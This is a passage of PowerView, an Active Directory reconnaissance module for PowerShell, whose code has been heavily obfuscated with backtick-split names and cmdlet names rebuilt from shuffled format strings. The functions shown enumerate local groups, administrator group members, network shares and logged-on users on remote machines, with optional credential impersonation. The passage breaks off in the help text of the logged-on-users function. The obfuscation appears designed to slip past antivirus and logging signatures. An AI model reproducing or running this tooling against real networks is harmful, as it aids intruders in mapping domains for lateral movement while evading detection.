            ${GPTt`m`pL`pAth} = ${G`pO}.gpcfilesyspath + "\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf"

            ${p`AR`seAr`gs} =  @{
                'GptTmplPath' = ${GPTT`M`PLPaTH}
                'OutputObject' = ${t`RUE}
            }
            if (${P`sBOu`NDpaRAm`ete`Rs}['Credential']) { ${p`ARse`ArGS}['Credential'] = ${CR`ED`ENTial} }

            # parse the GptTmpl.inf
            &("{1}{2}{0}" -f 'l','G','et-GptTmp') @ParseArgs | &("{4}{1}{3}{2}{0}" -f'ject','rEach-','b','O','Fo') {
                ${_} | &("{2}{0}{1}" -f'dd-M','ember','A') ("{2}{0}{1}{3}"-f't','e','No','property') 'GPOName' ${G`po}.name
                ${_} | &("{2}{1}{0}"-f 'r','dd-Membe','A') ("{2}{3}{0}{1}" -f 'p','erty','N','otepro') 'GPODisplayName' ${G`Po}.displayname
                ${_}
            }
        }
    }
}


########################################################
#
# Functions that enumerate a single host, either through
# WinNT, WMI, remote registry, or API calls
# (with PSReflect).
#
########################################################

function GEt-`N`ETL`O`CaLgR`OUP {
<#
.SYNOPSIS

Enumerates the local groups on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect  

.DESCRIPTION

This function will enumerate the names and descriptions for the
local groups on the current, or remote, machine. By default, the Win32 API
call NetLocalGroupEnum will be used (for speed). Specifying "-Method WinNT"
causes the WinNT service provider to be used instead, which returns group
SIDs along with the group names and descriptions/comments.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroup

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
WINDOWS1                      Administrators                Administrators have comple...
WINDOWS1                      Backup Operators              Backup Operators can overr...
WINDOWS1                      Cryptographic Operators       Members are authorized to ...
...

.EXAMPLE

Get-NetLocalGroup -Method Winnt

ComputerName           GroupName              GroupSID              Comment
------------           ---------              --------              -------
WINDOWS1               Administrators         S-1-5-32-544          Administrators hav...
WINDOWS1               Backup Operators       S-1-5-32-551          Backup Operators c...
WINDOWS1               Cryptographic Opera... S-1-5-32-569          Members are author...
...

.EXAMPLE

Get-NetLocalGroup -ComputerName primary.testlab.local

ComputerName                  GroupName                     Comment
------------                  ---------                     -------
primary.testlab.local         Administrators                Administrators have comple...
primary.testlab.local         Users                         Users are prevented from m...
primary.testlab.local         Guests                        Guests have the same acces...
primary.testlab.local         Print Operators               Members can administer dom...
primary.testlab.local         Backup Operators              Backup Operators can overr...

.OUTPUTS

PowerView.LocalGroup.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroup.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

https://msdn.microsoft.com/en-us/library/windows/desktop/aa370440(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroup.API')]
    [OutputType('PowerView.LocalGroup.WinNT')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${TR`UE}, ValueFromPipelineByPropertyName = ${TR`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${CO`m`pUTe`RnaME} = ${eNV:Co`m`PuTEr`NAme},

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        ${M`EthOD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cre`dEn`TiaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${pSb`oU`NDp`ARAmeTE`Rs}['Credential']) {
            ${LOGON`TOk`En} = &("{0}{1}{6}{5}{7}{4}{3}{2}" -f 'I','nvo','rsonation','e','rImp','Us','ke-','e') -Credential ${c`R`edential}
        }
    }

    PROCESS {
        ForEach (${CoM`pU`Ter} in ${c`OM`PU`Te`RnaMe}) {
            if (${Me`THOD} -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupEnum API call to get the local group information

                # arguments for NetLocalGroupEnum
                ${Qu`eryLe`V`el} = 1
                ${pT`R`inFO} = [IntPtr]::Zero
                ${eN`T`RIe`sREAd} = 0
                ${tO`TA`LrEad} = 0
                ${r`E`suMEHan`d`lE} = 0

                # get the local user information
                ${R`ESUlt} = ${N`etAPi`32}::NetLocalGroupEnum(${co`M`PUtER}, ${QuE`Ry`lEV`El}, [ref]${pt`Ri`NFO}, -1, [ref]${E`NTR`IESREAD}, [ref]${toTA`l`RE`Ad}, [ref]${R`ES`UME`HaNDLe})

                # locate the offset of the initial intPtr
                ${offS`ET} = ${pt`RiN`FO}.ToInt64()

                # 0 = success
                if ((${R`eSULT} -eq 0) -and (${o`F`FsET} -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    ${INcrem`e`Nt} = ${loc`ALgRO`UP_IN`F`o_1}::GetSize()

                    # parse all the result structures
                    for (${I} = 0; (${i} -lt ${E`NtRiE`S`ReaD}); ${I}++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        ${NE`W`intPtr} = &("{2}{0}{1}" -f'w-','Object','Ne') ("{1}{0}{2}"-f 'm.Intp','Syste','tr') -ArgumentList ${o`F`FsET}
                        ${i`NFo} = ${nEWIN`TP`TR} -as ${Lo`C`ALgr`oU`p_iNFo_1}

                        ${O`F`FseT} = ${Ne`wIN`TPTr}.ToInt64()
                        ${O`FFset} += ${I`Nc`Re`menT}

                        ${lO`c`A`LGrOuP} = &("{2}{1}{3}{0}" -f 'ct','-Obj','New','e') ("{2}{0}{1}" -f 'bj','ect','PSO')
                        ${LO`cALg`Roup} | &("{1}{0}{2}"-f 'dd-Me','A','mber') ("{2}{1}{3}{0}"-f 'y','t','No','epropert') 'ComputerName' ${CO`m`p`UTeR}
                        ${LOc`Alg`Ro`UP} | &("{0}{1}{2}"-f 'Add','-Memb','er') ("{2}{1}{0}"-f 'roperty','tep','No') 'GroupName' ${I`NFo}.lgrpi1_name
                        ${LOCAlGR`O`UP} | &("{1}{2}{0}" -f 'r','Add','-Membe') ("{1}{3}{0}{2}" -f 'er','Note','ty','prop') 'Comment' ${i`Nfo}.lgrpi1_comment
                        ${l`oCa`LGRO`UP}.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.API')
                        ${Lo`C`AlgRoup}
                    }
                    # free up the result buffer
                    ${N`ULL} = ${N`eTAPi`32}::NetApiBufferFree(${Pt`Ri`NFO})
                }
                else {
                    &("{1}{2}{3}{0}" -f'bose','W','rite-','Ver') "[Get-NetLocalGroup] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                ${CoMPut`e`R`P`RoVIDEr} = [ADSI]"WinNT://$Computer,computer"

                ${C`oMPutERp`R`O`VIDeR}.psbase.children | &("{3}{1}{2}{0}"-f 't','here-Ob','jec','W') { ${_}.psbase.schemaClassName -eq 'group' } | &("{0}{2}{1}{4}{3}"-f 'Fo','Eac','r','ject','h-Ob') {
                    ${Loc`ALG`ROup} = ([ADSI]${_})
                    ${G`ROUp} = &("{2}{0}{1}"-f 'e','w-Object','N') ("{2}{1}{0}" -f 't','Objec','PS')
                    ${gr`o`Up} | &("{1}{2}{0}{3}" -f'mb','A','dd-Me','er') ("{2}{3}{0}{1}" -f'per','ty','Notepr','o') 'ComputerName' ${C`OmpU`TEr}
                    ${gr`OUp} | &("{3}{1}{0}{2}"-f '-Me','dd','mber','A') ("{0}{2}{1}"-f 'No','perty','tepro') 'GroupName' (${l`Oca`lgRO`UP}.InvokeGet('Name'))
                    ${G`RO`Up} | &("{2}{1}{0}"-f'ember','dd-M','A') ("{1}{0}{3}{2}" -f 'otepro','N','ty','per') 'SID' ((&("{3}{1}{0}{2}"-f 'jec','Ob','t','New-') ("{7}{9}{3}{1}{4}{5}{2}{6}{8}{0}"-f'ier','Secu','al','.','rity.Prin','cip','.SecurityIden','Sys','tif','tem')(${locA`LGro`UP}.InvokeGet('objectsid'),0)).Value)
                    ${GR`oup} | &("{0}{1}{2}"-f 'Add-','Mem','ber') ("{2}{1}{0}{3}"-f 'ope','epr','Not','rty') 'Comment' (${loC`A`LGROuP}.InvokeGet('Description'))
                    ${G`Ro`Up}.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroup.WinNT')
                    ${GRO`Up}
                }
            }
        }
    }
    
    END {
        if (${lO`GO`NtokeN}) {
            &("{3}{0}{1}{2}{4}"-f 'n','vo','ke-Rev','I','ertToSelf') -TokenHandle ${Lo`go`NtokEn}
        }
    }
}


function GEt`-NEtlO`calg`R`o`Up`M`EMBER {
<#
.SYNOPSIS

Enumerates members of a specific local group on the local (or remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Convert-ADName  

.DESCRIPTION

This function will enumerate the members of a specified local group  on the
current, or remote, machine. By default, the Win32 API call NetLocalGroupGetMembers
will be used (for speed). Specifying "-Method WinNT" causes the WinNT service provider
to be used instead, which returns a larger amount of information.

.PARAMETER ComputerName

Specifies the hostname to query for sessions (also accepts IP addresses).
Defaults to the localhost.

.PARAMETER GroupName

The local group name to query for users. If not given, it defaults to "Administrators".

.PARAMETER Method

The collection method to use, defaults to 'API', also accepts 'WinNT'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to a remote machine. Only applicable with "-Method WinNT".

.EXAMPLE

Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroupMember -Method winnt | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True

.EXAMPLE

Get-NetLocalGroup | Get-NetLocalGroupMember | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
WINDOWS1       Administrators WINDOWS1\Ad... S-1-5-21-25...          False          False
WINDOWS1       Administrators WINDOWS1\lo... S-1-5-21-25...          False          False
WINDOWS1       Administrators TESTLAB\Dom... S-1-5-21-89...           True           True
WINDOWS1       Administrators TESTLAB\har... S-1-5-21-89...          False           True
WINDOWS1       Guests         WINDOWS1\Guest S-1-5-21-25...          False          False
WINDOWS1       IIS_IUSRS      NT AUTHORIT... S-1-5-17                False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-4                 False          False
WINDOWS1       Users          NT AUTHORIT... S-1-5-11                False          False
WINDOWS1       Users          WINDOWS1\lo... S-1-5-21-25...          False        UNKNOWN
WINDOWS1       Users          TESTLAB\Dom... S-1-5-21-89...           True        UNKNOWN

.EXAMPLE

Get-NetLocalGroupMember -ComputerName primary.testlab.local | ft

ComputerName   GroupName      MemberName     SID                   IsGroup       IsDomain
------------   ---------      ----------     ---                   -------       --------
primary.tes... Administrators TESTLAB\Adm... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\loc... S-1-5-21-89...          False          False
primary.tes... Administrators TESTLAB\Ent... S-1-5-21-89...           True          False
primary.tes... Administrators TESTLAB\Dom... S-1-5-21-89...           True          False

.OUTPUTS

PowerView.LocalGroupMember.API

Custom PSObject with translated group property fields from API results.

PowerView.LocalGroupMember.WinNT

Custom PSObject with translated group property fields from WinNT results.

.LINK

http://stackoverflow.com/questions/21288220/get-all-local-members-and-groups-displayed-together
http://msdn.microsoft.com/en-us/library/aa772211(VS.85).aspx
https://msdn.microsoft.com/en-us/library/windows/desktop/aa370601(v=vs.85).aspx
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LocalGroupMember.API')]
    [OutputType('PowerView.LocalGroupMember.WinNT')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${TR`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${c`oM`P`UTe`RNAmE} = ${env:`C`OmPUter`N`AME},

        [Parameter(ValueFromPipelineByPropertyName = ${t`Rue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${Gr`OUp`NAMe} = 'Administrators',

        [ValidateSet('API', 'WinNT')]
        [Alias('CollectionMethod')]
        [String]
        ${mE`THoD} = 'API',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`R`eDEN`TIal} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${PSbOun`DP`A`R`AMeteRS}['Credential']) {
            ${loGO`N`To`kEn} = &("{0}{1}{2}{5}{4}{3}" -f 'Invo','k','e-User','onation','s','Imper') -Credential ${C`Rede`N`TiAl}
        }
    }

    PROCESS {
        ForEach (${c`OM`puter} in ${c`o`mputErNAMe}) {
            if (${M`eT`hOD} -eq 'API') {
                # if we're using the Netapi32 NetLocalGroupGetMembers API call to get the local group information

                # arguments for NetLocalGroupGetMembers
                ${qUE`RYlev`EL} = 2
                ${pt`R`iNfo} = [IntPtr]::Zero
                ${ENtR`ieSre`Ad} = 0
                ${t`otalR`Ead} = 0
                ${R`ESUMe`hAnDLe} = 0

                # get the local user information
                ${R`E`SuLT} = ${n`E`TApI32}::NetLocalGroupGetMembers(${co`mpUt`er}, ${gRO`Up`NaME}, ${quErY`L`e`Vel}, [ref]${Pt`RiNfO}, -1, [ref]${entrie`s`REaD}, [ref]${T`OtA`l`Read}, [ref]${REs`UMehA`N`dLE})

                # locate the offset of the initial intPtr
                ${oF`F`seT} = ${PtRI`N`Fo}.ToInt64()

                ${me`MBe`Rs} = @()

                # 0 = success
                if ((${r`E`sULt} -eq 0) -and (${OFFS`Et} -gt 0)) {

                    # Work out how much to increment the pointer by finding out the size of the structure
                    ${incRe`mE`Nt} = ${lOC`Algro`Up_`mE`mbe`Rs_I`NfO_2}::GetSize()

                    # parse all the result structures
                    for (${i} = 0; (${I} -lt ${EntRi`e`S`REad}); ${i}++) {
                        # create a new int ptr at the given offset and cast the pointer as our result structure
                        ${nE`wINtp`Tr} = &("{0}{2}{1}{3}" -f 'New-','je','Ob','ct') ("{0}{4}{3}{2}{1}" -f'Sys','tr','tp','em.In','t') -ArgumentList ${o`FfS`ET}
                        ${In`Fo} = ${N`ewiNtp`Tr} -as ${lOCAlg`R`o`Up`_me`mbeRS_IN`Fo`_2}

                        ${OF`FSeT} = ${NEW`In`TptR}.ToInt64()
                        ${oFFs`Et} += ${i`NCReM`eNt}

                        ${SiDSt`R`I`NG} = ''
                        ${rESul`T2} = ${A`dvApi32}::ConvertSidToStringSid(${i`NFo}.lgrmi2_sid, [ref]${sID`ST`RiNg});${LA`stErr`oR} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                        if (${rE`S`UlT2} -eq 0) {
                            &("{3}{1}{0}{2}"-f'rb','ite-Ve','ose','Wr') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
                        }
                        else {
                            ${m`eMBeR} = &("{2}{0}{1}"-f 'ew','-Object','N') ("{1}{0}"-f 'Object','PS')
                            ${M`E`MBer} | &("{0}{2}{1}" -f 'Add-Me','ber','m') ("{3}{2}{0}{1}"-f'tepropert','y','o','N') 'ComputerName' ${coMPu`T`Er}
                            ${m`E`mber} | &("{1}{0}{2}"-f 'Membe','Add-','r') ("{2}{1}{0}" -f'rty','pe','Notepro') 'GroupName' ${G`ROUP`Name}
                            ${M`eMb`Er} | &("{3}{1}{2}{0}" -f'ember','dd-','M','A') ("{1}{3}{0}{2}"-f'ert','Not','y','eprop') 'MemberName' ${i`NFO}.lgrmi2_domainandname
                            ${mEMb`er} | &("{2}{0}{1}"-f '-Memb','er','Add') ("{0}{2}{3}{1}"-f 'N','operty','ot','epr') 'SID' ${S`iD`stRinG}
                            ${IsG`ROUP} = $(${I`NFo}.lgrmi2_sidusage -eq 'SidTypeGroup')
                            ${me`MBER} | &("{2}{0}{1}"-f'b','er','Add-Mem') ("{3}{1}{0}{2}" -f 'oper','otepr','ty','N') 'IsGroup' ${iS`G`ROuP}
                            ${mE`mBER}.PSObject.TypeNames.Insert(0, 'PowerView.LocalGroupMember.API')
                            ${mEm`B`erS} += ${m`em`BEr}
                        }
                    }

                    # free up the result buffer
                    ${NU`ll} = ${nEtAP`i`32}::NetApiBufferFree(${PT`R`InfO})

                    # try to extract out the machine SID by using the -500 account as a reference
                    ${m`A`CH`INesid} = ${membe`RS} | &("{0}{2}{1}" -f'W','bject','here-O') {${_}.SID -match '.*-500' -or (${_}.SID -match '.*-501')} | &("{2}{3}{1}{0}"-f 'ject','b','Select','-O') -Expand ("{1}{0}"-f'ID','S')
                    if (${M`AcHi`NES`ID}) {
                        ${Ma`C`hiNESid} = ${m`ACHINES`iD}.Substring(0, ${mA`CHInes`id}.LastIndexOf('-'))

                        ${Mem`BE`RS} | &("{3}{2}{0}{1}" -f 'ec','t','j','ForEach-Ob') {
                            if (${_}.SID -match ${MA`chiN`e`SiD}) {
                                ${_} | &("{0}{1}{2}"-f'Ad','d-Me','mber') ("{3}{2}{1}{0}"-f'roperty','tep','o','N') 'IsDomain' ${fal`sE}
                            }
                            else {
                                ${_} | &("{2}{1}{3}{0}" -f 'r','dd','A','-Membe') ("{2}{0}{1}"-f 'e','rty','Noteprop') 'IsDomain' ${tR`Ue}
                            }
                        }
                    }
                    else {
                        ${M`emb`eRs} | &("{1}{0}{2}" -f'-O','ForEach','bject') {
                            if (${_}.SID -notmatch 'S-1-5-21') {
                                ${_} | &("{3}{0}{2}{1}" -f 'em','er','b','Add-M') ("{0}{2}{3}{1}"-f'N','operty','ot','epr') 'IsDomain' ${fAl`sE}
                            }
                            else {
                                ${_} | &("{2}{0}{1}" -f'-Me','mber','Add') ("{0}{2}{3}{1}"-f'No','perty','tepr','o') 'IsDomain' 'UNKNOWN'
                            }
                        }
                    }
                    ${ME`MB`ERs}
                }
                else {
                    &("{1}{2}{0}"-f 'rbose','Writ','e-Ve') "[Get-NetLocalGroupMember] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
                }
            }
            else {
                # otherwise we're using the WinNT service provider
                try {
                    ${gRouP`P`R`OV`iDeR} = [ADSI]"WinNT://$Computer/$GroupName,group"

                    ${gro`Upp`Rovi`dEr}.psbase.Invoke('Members') | &("{3}{2}{0}{1}" -f 'ch','-Object','Ea','For') {

                        ${mE`Mb`eR} = &("{0}{1}{2}" -f 'New','-Ob','ject') ("{1}{0}{2}" -f'SOb','P','ject')
                        ${meMb`eR} | &("{2}{0}{3}{1}"-f'd','Member','A','d-') ("{2}{1}{0}" -f'erty','oteprop','N') 'ComputerName' ${coM`pUt`er}
                        ${ME`MB`er} | &("{0}{2}{1}"-f'Add','ber','-Mem') ("{0}{2}{1}"-f 'Not','y','epropert') 'GroupName' ${Gr`OU`Pna`ME}

                        ${LoCal`U`SER} = ([ADSI]${_})
                        ${Ad`sp`ATh} = ${l`OCAlU`SeR}.InvokeGet('AdsPath').Replace('WinNT://', '')
                        ${Is`Gro`Up} = (${loca`L`Us`Er}.SchemaClassName -like 'group')

                        if(([regex]::Matches(${Ad`Sp`ATh}, '/')).count -eq 1) {
                            # DOMAIN\user
                            ${mEmBe`R`IS`dOma`In} = ${t`RUe}
                            ${nA`me} = ${a`Dspa`TH}.Replace('/', '\')
                        }
                        else {
                            # DOMAIN\machine\user
                            ${Member`iSDOM`A`iN} = ${FAl`Se}
                            ${N`Ame} = ${aDS`pA`TH}.Substring(${AD`spa`TH}.IndexOf('/')+1).Replace('/', '\')
                        }

                        ${mEM`Ber} | &("{0}{1}{2}"-f 'Ad','d-Mem','ber') ("{1}{2}{0}"-f'ty','No','teproper') 'AccountName' ${N`AMe}
                        ${M`embEr} | &("{0}{2}{1}"-f 'Add-Mem','r','be') ("{3}{1}{2}{0}" -f 'perty','r','o','Notep') 'SID' ((&("{2}{1}{0}"-f'bject','-O','New') ("{1}{8}{9}{5}{3}{7}{6}{2}{11}{0}{4}{10}" -f'Securi','Sy','al','r','tyIdentifi','Security.P','ip','inc','ste','m.','er','.')(${LO`Ca`LuSEr}.InvokeGet('ObjectSID'),0)).Value)
                        ${mE`MB`eR} | &("{1}{0}{2}" -f 'd','Ad','-Member') ("{1}{0}{2}"-f 't','No','eproperty') 'IsGroup' ${IS`groUP}
                        ${MeM`BeR} | &("{1}{2}{0}" -f'r','Ad','d-Membe') ("{1}{0}{2}" -f 'rope','Notep','rty') 'IsDomain' ${m`eM`Be`RISDOMAIN}

                        # if ($MemberIsDomain) {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ''
                        #     $Member | Add-Member Noteproperty 'Disabled' ''

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' $LocalUser.InvokeGet('LastLogin')
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        #     $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #     $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #     $Member | Add-Member Noteproperty 'UserFlags' ''
                        # }
                        # else {
                        #     # translate the binary sid to a string
                        #     $Member | Add-Member Noteproperty 'SID' ((New-Object System.Security.Principal.SecurityIdentifier($LocalUser.InvokeGet('ObjectSID'),0)).Value)
                        #     $Member | Add-Member Noteproperty 'Description' ($LocalUser.Description)

                        #     if ($IsGroup) {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ''
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ''
                        #         $Member | Add-Member Noteproperty 'UserFlags' ''
                        #         $Member | Add-Member Noteproperty 'Disabled' ''
                        #         $Member | Add-Member Noteproperty 'LastLogin' ''
                        #     }
                        #     else {
                        #         $Member | Add-Member Noteproperty 'PwdLastSet' ( (Get-Date).AddSeconds(-$LocalUser.PasswordAge[0]))
                        #         $Member | Add-Member Noteproperty 'PwdExpired' ( $LocalUser.PasswordExpired[0] -eq '1')
                        #         $Member | Add-Member Noteproperty 'UserFlags' ( $LocalUser.UserFlags[0] )
                        #         # UAC flags of 0x2 mean the account is disabled
                        #         $Member | Add-Member Noteproperty 'Disabled' $(($LocalUser.UserFlags.value -band 2) -eq 2)
                        #         try {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ( $LocalUser.LastLogin[0])
                        #         }
                        #         catch {
                        #             $Member | Add-Member Noteproperty 'LastLogin' ''
                        #         }
                        #     }
                        # }

                        ${me`MB`er}
                    }
                }
                catch {
                    &("{0}{1}{3}{2}"-f'Writ','e-Verb','e','os') "[Get-NetLocalGroupMember] Error for $Computer : $_"
                }
            }
        }
    }
    
    END {
        if (${L`ogO`NTOKeN}) {
            &("{1}{0}{2}{3}"-f 'er','Invoke-Rev','tToS','elf') -TokenHandle ${l`OG`ONtOk`En}
        }
    }
}


function ge`T-`N`etshaRE {
<#
.SYNOPSIS

Returns open shares on the local (or a remote) machine.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetShareEnum Win32API call to query
a given host for open shares. This is a replacement for "net share \\hostname".

.PARAMETER ComputerName

Specifies the hostname to query for shares (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetShare

Returns active shares on the local host.

.EXAMPLE

Get-NetShare -ComputerName sqlserver

Returns active shares on the 'sqlserver' host

.EXAMPLE

Get-DomainComputer | Get-NetShare

Returns all shares for all computers in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetShare -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.ShareInfo

A PSCustomObject representing a SHARE_INFO_1 structure, including
the name/type/remark for each share, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

    [OutputType('PowerView.ShareInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = ${tR`UE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${cOmPu`Te`RN`AMe} = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdE`N`TIAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if (${P`s`BOUnDParame`TERs}['Credential']) {
            ${loGo`NT`oKen} = &("{2}{0}{4}{3}{1}"-f'-U','sonation','Invoke','per','serIm') -Credential ${cR`ED`ential}
        }
    }

    PROCESS {
        ForEach (${C`oM`PuTer} in ${c`Om`pU`TernAME}) {
            # arguments for NetShareEnum
            ${quER`ylev`eL} = 1
            ${PtRi`N`Fo} = [IntPtr]::Zero
            ${ENtrI`ES`R`EAD} = 0
            ${total`RE`Ad} = 0
            ${rEs`UmEha`N`dlE} = 0

            # get the raw share information
            ${r`esULT} = ${ne`T`APi32}::NetShareEnum(${c`o`mPUtEr}, ${QU`e`RYl`evEl}, [ref]${P`Tr`InFO}, -1, [ref]${en`Tri`esre`Ad}, [ref]${TOtaLR`E`Ad}, [ref]${ReS`U`MEHANdlE})

            # locate the offset of the initial intPtr
            ${OF`F`set} = ${p`Tr`iNFo}.ToInt64()

            # 0 = success
            if ((${R`eSuLt} -eq 0) -and (${of`F`SEt} -gt 0)) {

                # work out how much to increment the pointer by finding out the size of the structure
                ${i`NCr`eMeNt} = ${sHAR`E_iN`F`o_1}::GetSize()

                # parse all the result structures
                for (${I} = 0; (${I} -lt ${eNT`Ri`ESr`EAd}); ${i}++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    ${n`e`WINtPtr} = &("{1}{2}{0}"-f'-Object','N','ew') ("{3}{2}{0}{1}" -f 'em.Intp','tr','yst','S') -ArgumentList ${o`FfsET}
                    ${I`NFo} = ${n`EWINt`PtR} -as ${shar`e`_`info`_1}

                    # return all the sections of the structure - have to do it this way for V2
                    ${S`haRE} = ${in`FO} | &("{3}{0}{1}{2}" -f'lect-O','b','ject','Se') ('*')
                    ${sHa`RE} | &("{2}{0}{1}"-f 'm','ber','Add-Me') ("{0}{1}{2}" -f 'Noteprop','ert','y') 'ComputerName' ${cOm`p`U`TEr}
                    ${shA`Re}.PSObject.TypeNames.Insert(0, 'PowerView.ShareInfo')
                    ${O`F`FSeT} = ${n`eW`intpTR}.ToInt64()
                    ${O`FF`sEt} += ${i`N`cRemE`Nt}
                    ${SH`A`Re}
                }

                # free up the result buffer
                ${nu`lL} = ${NEtap`i32}::NetApiBufferFree(${Ptr`IN`Fo})
            }
            else {
                &("{1}{0}{4}{2}{3}" -f 'ite-Ve','Wr','b','ose','r') "[Get-NetShare] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }

    END {
        if (${l`OG`onTokEN}) {
            &("{0}{5}{4}{2}{1}{3}"-f 'Invo','ertT','ev','oSelf','R','ke-') -TokenHandle ${LO`g`OnTO`KEn}
        }
    }
}


function g`eT-`NETLOG`GE`DON {
<#
.SYNOPSIS

Returns users logged on the local (or a remote) machine.
Note: administrative rights needed for newer Windows OSes.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: PSReflect, Invoke-UserImpersonation, Invoke-RevertToSelf  

.DESCRIPTION

This function will execute the NetWkstaUserEnum Win32API call to query
a given host for actively logged on users.

.PARAMETER ComputerName

Specifies the hostname to query for logged on users (also accepts IP addresses).
Defaults to 'localhost'.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system using Invoke-UserImpersonation.

.EXAMPLE

Get-NetLoggedon

Returns users actively logged onto the local host.

.EXAMPLE

Get-NetLoggedon -ComputerName sqlserver

Returns users actively logged onto the 'sqlserver' host.

.EXAMPLE

Get-DomainComputer | Get-NetLoggedon

Returns all logged on users for all computers in the domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-NetLoggedon -ComputerName sqlserver -Credential $Cred

.OUTPUTS

PowerView.LoggedOnUserInfo

A PSCustomObject representing a WKSTA_USER_INFO_1 structure, including
the UserName/LogonDomain/AuthDomains/LogonServer for each user, with the ComputerName added.

.LINK

http://www.powershellmagazine.com/2014/09/25/easily-defining-enums-structs-and-win32-functions-in-memory/
#>

